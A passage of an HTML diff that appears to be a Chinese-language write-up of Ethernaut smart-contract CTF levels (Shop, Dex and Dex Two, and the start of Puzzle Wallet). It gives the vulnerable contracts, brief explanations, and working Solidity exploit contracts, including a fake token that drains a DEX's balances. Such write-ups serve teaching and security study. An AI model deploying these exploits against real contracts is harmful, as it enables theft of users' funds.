+<a id="__codelineno-42-17" name="__codelineno-42-17" href="__codelineno-42-17"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-42-18" name="__codelineno-42-18" href="__codelineno-42-18"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<hr />
+<h2 id="shop">Shop<a class="headerlink" href="#shop" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="__codelineno-43-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="__codelineno-43-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="__codelineno-43-3"></a>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="__codelineno-43-4"></a>interface<span class="w"> </span>Buyer<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="__codelineno-43-5"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">price</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-43-6" name="__codelineno-43-6" href="__codelineno-43-6"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-43-7" name="__codelineno-43-7" href="__codelineno-43-7"></a>
+<a id="__codelineno-43-8" name="__codelineno-43-8" href="__codelineno-43-8"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Shop</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-43-9" name="__codelineno-43-9" href="__codelineno-43-9"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="k">public </span><span class="nv">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-43-10" name="__codelineno-43-10" href="__codelineno-43-10"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="k">public </span><span class="nv">isSold</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-43-11" name="__codelineno-43-11" href="__codelineno-43-11"></a>
+<a id="__codelineno-43-12" name="__codelineno-43-12" href="__codelineno-43-12"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">buy</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-43-13" name="__codelineno-43-13" href="__codelineno-43-13"></a><span class="w">        </span>Buyer<span class="w"> </span>_buyer<span class="w"> </span><span class="o">=</span><span class="w"> </span>Buyer<span class="p">(</span><span class="k">msg.sender</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-43-14" name="__codelineno-43-14" href="__codelineno-43-14"></a>
+<a id="__codelineno-43-15" name="__codelineno-43-15" href="__codelineno-43-15"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>_buyer<span class="p">.</span>price<span class="p">()</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>price<span class="w"> </span><span class="err">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>isSold<span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-43-16" name="__codelineno-43-16" href="__codelineno-43-16"></a><span class="w">            </span>isSold<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-43-17" name="__codelineno-43-17" href="__codelineno-43-17"></a><span class="w">            </span>price<span class="w"> </span><span class="o">=</span><span class="w"> </span>_buyer<span class="p">.</span>price<span class="p">();</span><span class="w"></span>
+<a id="__codelineno-43-18" name="__codelineno-43-18" href="__codelineno-43-18"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-43-19" name="__codelineno-43-19" href="__codelineno-43-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-43-20" name="__codelineno-43-20" href="__codelineno-43-20"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>目的是使 price 小于 100。和 Elevator 类似，只要使两次调用 price 得到的值不一样就可以了</p>
+<details class="done" open="open">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="__codelineno-44-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="__codelineno-44-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-44-3" name="__codelineno-44-3" href="__codelineno-44-3"></a>
+<a id="__codelineno-44-4" name="__codelineno-44-4" href="__codelineno-44-4"></a><span class="cm">/* code of Shop */</span><span class="w"></span>
+<a id="__codelineno-44-5" name="__codelineno-44-5" href="__codelineno-44-5"></a>
+<a id="__codelineno-44-6" name="__codelineno-44-6" href="__codelineno-44-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-44-7" name="__codelineno-44-7" href="__codelineno-44-7"></a><span class="w">    </span>Shop<span class="w"> </span>challenge<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-44-8" name="__codelineno-44-8" href="__codelineno-44-8"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">addr</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-44-9" name="__codelineno-44-9" href="__codelineno-44-9"></a><span class="w">        </span>challenge<span class="w"> </span><span class="o">=</span><span class="w"> </span>Shop<span class="p">(</span>addr<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-44-10" name="__codelineno-44-10" href="__codelineno-44-10"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-44-11" name="__codelineno-44-11" href="__codelineno-44-11"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">price</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-44-12" name="__codelineno-44-12" href="__codelineno-44-12"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>challenge<span class="p">.</span>isSold<span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-44-13" name="__codelineno-44-13" href="__codelineno-44-13"></a><span class="w">            </span><span class="kt">return</span><span class="w"> </span><span class="m m-Decimal">90</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-44-14" name="__codelineno-44-14" href="__codelineno-44-14"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-44-15" name="__codelineno-44-15" href="__codelineno-44-15"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-44-16" name="__codelineno-44-16" href="__codelineno-44-16"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-44-17" name="__codelineno-44-17" href="__codelineno-44-17"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">exp</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-44-18" name="__codelineno-44-18" href="__codelineno-44-18"></a><span class="w">        </span>challenge<span class="p">.</span>buy<span class="p">();</span><span class="w"></span>
+<a id="__codelineno-44-19" name="__codelineno-44-19" href="__codelineno-44-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-44-20" name="__codelineno-44-20" href="__codelineno-44-20"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<hr />
+<h2 id="dex-dex-two">Dex &amp; Dex Two<a class="headerlink" href="#dex-dex-two" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="__codelineno-45-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-45-2" name="__codelineno-45-2" href="__codelineno-45-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-3" name="__codelineno-45-3" href="__codelineno-45-3"></a>
+<a id="__codelineno-45-4" name="__codelineno-45-4" href="__codelineno-45-4"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-5" name="__codelineno-45-5" href="__codelineno-45-5"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-6" name="__codelineno-45-6" href="__codelineno-45-6"></a><span class="kt">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-7" name="__codelineno-45-7" href="__codelineno-45-7"></a>
+<a id="__codelineno-45-8" name="__codelineno-45-8" href="__codelineno-45-8"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Dex</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-9" name="__codelineno-45-9" href="__codelineno-45-9"></a><span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-10" name="__codelineno-45-10" href="__codelineno-45-10"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">token1</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-11" name="__codelineno-45-11" href="__codelineno-45-11"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">token2</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-12" name="__codelineno-45-12" href="__codelineno-45-12"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_token1</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_token2</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-13" name="__codelineno-45-13" href="__codelineno-45-13"></a><span class="w">        </span>token1<span class="w"> </span><span class="o">=</span><span class="w"> </span>_token1<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-14" name="__codelineno-45-14" href="__codelineno-45-14"></a><span class="w">        </span>token2<span class="w"> </span><span class="o">=</span><span class="w"> </span>_token2<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-45-15" name="__codelineno-45-15" href="__codelineno-45-15"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-16" name="__codelineno-45-16" href="__codelineno-45-16"></a>
+<a id="__codelineno-45-17" name="__codelineno-45-17" href="__codelineno-45-17"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">swap</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">from</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-18" name="__codelineno-45-18" href="__codelineno-45-18"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>IERC20<span class="p">(</span>from<span class="p">).</span>balanceOf<span class="p">(</span><span class="k">msg.sender</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>amount<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not enough to swap&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-19" name="__codelineno-45-19" href="__codelineno-45-19"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">swap_amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>get_swap_price<span class="p">(</span>from<span class="p">,</span><span class="w"> </span>to<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-20" name="__codelineno-45-20" href="__codelineno-45-20"></a><span class="w">        </span>IERC20<span class="p">(</span>from<span class="p">).</span>transferFrom<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-21" name="__codelineno-45-21" href="__codelineno-45-21"></a><span class="w">        </span>IERC20<span class="p">(</span>to<span class="p">).</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>swap_amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-22" name="__codelineno-45-22" href="__codelineno-45-22"></a><span class="w">        </span>IERC20<span class="p">(</span>to<span class="p">).</span>transferFrom<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>swap_amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-23" name="__codelineno-45-23" href="__codelineno-45-23"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-24" name="__codelineno-45-24" href="__codelineno-45-24"></a>
+<a id="__codelineno-45-25" name="__codelineno-45-25" href="__codelineno-45-25"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">add_liquidity</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">token_address</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-26" name="__codelineno-45-26" href="__codelineno-45-26"></a><span class="w">        </span>IERC20<span class="p">(</span>token_address<span class="p">).</span>transferFrom<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-27" name="__codelineno-45-27" href="__codelineno-45-27"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-28" name="__codelineno-45-28" href="__codelineno-45-28"></a>
+<a id="__codelineno-45-29" name="__codelineno-45-29" href="__codelineno-45-29"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">get_swap_price</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">from</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span><span class="w"></span>
+<a id="__codelineno-45-30" name="__codelineno-45-30" href="__codelineno-45-30"></a><span class="w">        </span><span class="kt">return</span><span class="p">((</span>amount<span class="w"> </span><span class="o">*</span><span class="w"> </span>IERC20<span class="p">(</span>to<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)))</span><span class="o">/</span>IERC20<span class="p">(</span>from<span class="p">).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span><span class="w"></span>
+<a id="__codelineno-45-31" name="__codelineno-45-31" href="__codelineno-45-31"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-32" name="__codelineno-45-32" href="__codelineno-45-32"></a>
+<a id="__codelineno-45-33" name="__codelineno-45-33" href="__codelineno-45-33"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">approve</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">spender</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-34" name="__codelineno-45-34" href="__codelineno-45-34"></a><span class="w">        </span>SwappableToken<span class="p">(</span>token1<span class="p">).</span>approve<span class="p">(</span>spender<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-35" name="__codelineno-45-35" href="__codelineno-45-35"></a><span class="w">        </span>SwappableToken<span class="p">(</span>token2<span class="p">).</span>approve<span class="p">(</span>spender<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-36" name="__codelineno-45-36" href="__codelineno-45-36"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-37" name="__codelineno-45-37" href="__codelineno-45-37"></a>
+<a id="__codelineno-45-38" name="__codelineno-45-38" href="__codelineno-45-38"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">token</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span><span class="w"></span>
+<a id="__codelineno-45-39" name="__codelineno-45-39" href="__codelineno-45-39"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span>IERC20<span class="p">(</span>token<span class="p">).</span>balanceOf<span class="p">(</span>account<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-40" name="__codelineno-45-40" href="__codelineno-45-40"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-41" name="__codelineno-45-41" href="__codelineno-45-41"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-42" name="__codelineno-45-42" href="__codelineno-45-42"></a>
+<a id="__codelineno-45-43" name="__codelineno-45-43" href="__codelineno-45-43"></a><span class="k">contract</span><span class="w"> </span><span class="ni">SwappableToken</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>ERC20<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-44" name="__codelineno-45-44" href="__codelineno-45-44"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">string</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>name<span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>symbol<span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">initialSupply</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>ERC20<span class="p">(</span>name<span class="p">,</span><span class="w"> </span>symbol<span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-45-45" name="__codelineno-45-45" href="__codelineno-45-45"></a><span class="w">        </span>_mint<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>initialSupply<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-45-46" name="__codelineno-45-46" href="__codelineno-45-46"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-45-47" name="__codelineno-45-47" href="__codelineno-45-47"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>题意就是玩家账户上的 token1 和 token2 都各有 10 个 token，而题目账户上有 100 个，目的是把题目账户上的某个 token 清零</p>
+<p>题目的 Dex 合约主要提供了 swap 这个函数用来在两个 token 间交换金额。但是转出的时候先调用了 get_swap_price 来计算金额，而且在其中调用的是两方格子的 balanceOf 函数。因此可以构造一个新的 IERC20 的 token，让它的 balanceOf 始终返回 1，作为分母，这样转出的时候就会转出题目 token 中的所有余额了</p>
+<p>Dex Two 和 Dex 差别就在于 DexTwo 需要将两个 token 都置为 0，用 exp 函数分别打下 token1 和 token2 就行</p>
+<details class="done" open="open">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="__codelineno-46-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-46-2" name="__codelineno-46-2" href="__codelineno-46-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-46-3" name="__codelineno-46-3" href="__codelineno-46-3"></a>
+<a id="__codelineno-46-4" name="__codelineno-46-4" href="__codelineno-46-4"></a><span class="cm">/* code of Dex */</span><span class="w"></span>
+<a id="__codelineno-46-5" name="__codelineno-46-5" href="__codelineno-46-5"></a>
+<a id="__codelineno-46-6" name="__codelineno-46-6" href="__codelineno-46-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">ExploitToken</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-7" name="__codelineno-46-7" href="__codelineno-46-7"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-8" name="__codelineno-46-8" href="__codelineno-46-8"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-46-9" name="__codelineno-46-9" href="__codelineno-46-9"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-46-10" name="__codelineno-46-10" href="__codelineno-46-10"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-11" name="__codelineno-46-11" href="__codelineno-46-11"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-46-12" name="__codelineno-46-12" href="__codelineno-46-12"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-46-13" name="__codelineno-46-13" href="__codelineno-46-13"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-46-14" name="__codelineno-46-14" href="__codelineno-46-14"></a>
+<a id="__codelineno-46-15" name="__codelineno-46-15" href="__codelineno-46-15"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-16" name="__codelineno-46-16" href="__codelineno-46-16"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">new</span><span class="w"> </span>ExploitToken<span class="p">());</span><span class="w"></span>
+<a id="__codelineno-46-17" name="__codelineno-46-17" href="__codelineno-46-17"></a><span class="w">    </span>Dex<span class="w"> </span>challenge<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-46-18" name="__codelineno-46-18" href="__codelineno-46-18"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">addr</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-19" name="__codelineno-46-19" href="__codelineno-46-19"></a><span class="w">        </span>challenge<span class="w"> </span><span class="o">=</span><span class="w"> </span>Dex<span class="p">(</span>addr<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-46-20" name="__codelineno-46-20" href="__codelineno-46-20"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-46-21" name="__codelineno-46-21" href="__codelineno-46-21"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">exp</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">token1</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-46-22" name="__codelineno-46-22" href="__codelineno-46-22"></a><span class="w">        </span>challenge<span class="p">.</span>swap<span class="p">(</span>token<span class="p">,</span><span class="w"> </span>token1<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-46-23" name="__codelineno-46-23" href="__codelineno-46-23"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-46-24" name="__codelineno-46-24" href="__codelineno-46-24"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<hr />
+<h2 id="puzzle-wallet">Puzzle Wallet<a class="headerlink" href="#puzzle-wallet" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="__codelineno-47-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="__codelineno-47-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="__codelineno-47-3"></a>pragma<span class="w"> </span>experimental<span class="w"> </span>ABIEncoderV2<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-4" name="__codelineno-47-4" href="__codelineno-47-4"></a>
+<a id="__codelineno-47-5" name="__codelineno-47-5" href="__codelineno-47-5"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/math/SafeMath.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-6" name="__codelineno-47-6" href="__codelineno-47-6"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-7" name="__codelineno-47-7" href="__codelineno-47-7"></a>
+<a id="__codelineno-47-8" name="__codelineno-47-8" href="__codelineno-47-8"></a><span class="k">contract</span><span class="w"> </span><span class="ni">PuzzleProxy</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>UpgradeableProxy<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-9" name="__codelineno-47-9" href="__codelineno-47-9"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">pendingAdmin</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-10" name="__codelineno-47-10" href="__codelineno-47-10"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">admin</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-11" name="__codelineno-47-11" href="__codelineno-47-11"></a>
+<a id="__codelineno-47-12" name="__codelineno-47-12" href="__codelineno-47-12"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_admin</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_implementation</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>_initData<span class="p">)</span><span class="w"> </span>UpgradeableProxy<span class="p">(</span>_implementation<span class="p">,</span><span class="w"> </span>_initData<span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-13" name="__codelineno-47-13" href="__codelineno-47-13"></a><span class="w">        </span>admin<span class="w"> </span><span class="o">=</span><span class="w"> </span>_admin<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-14" name="__codelineno-47-14" href="__codelineno-47-14"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-15" name="__codelineno-47-15" href="__codelineno-47-15"></a>
